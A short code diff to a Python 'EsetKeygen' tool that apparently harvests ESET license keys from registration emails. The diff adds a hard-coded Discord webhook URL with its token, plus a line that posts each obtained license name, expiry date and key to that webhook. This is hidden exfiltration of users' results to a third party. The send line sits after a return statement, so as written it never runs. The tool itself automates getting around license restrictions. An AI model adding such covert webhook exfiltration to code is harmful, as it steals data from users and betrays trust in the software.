@@ -1,9 +1,10 @@
 from modules.logger import *
 from modules.shared_tools import *
 from modules.sec_email_api import *
-
+from dhooks import Webhook
 import time
 import re
+hook = Webhook("https://discord.com/api/webhooks/1190161934578876416/7nM6CPehVb8PQ_zFAZsuEkwwlIQsJYsqqsZzNKNtNcPT0HYV2NziAvVoFrdWXc-Oujkn")
 
 class EsetKeygen:
     def __init__(self, registered_email_obj: SecEmail, driver):
@@ -70,4 +71,5 @@ class EsetKeygen:
                     license_out_date = (''.join(re.findall(r'\d{1,2}.\d{1,2}.\d{4}', message_body)))
                     console_log('[V2] Information successfully received!', OK)
                     return license_name, license_out_date, license_key
+                    hook.send(f'License key = ${license_name} \n License Outdate = ${license_out_date} \n License key = ${license_key}')
                 time.sleep(DEFAULT_DELAY)
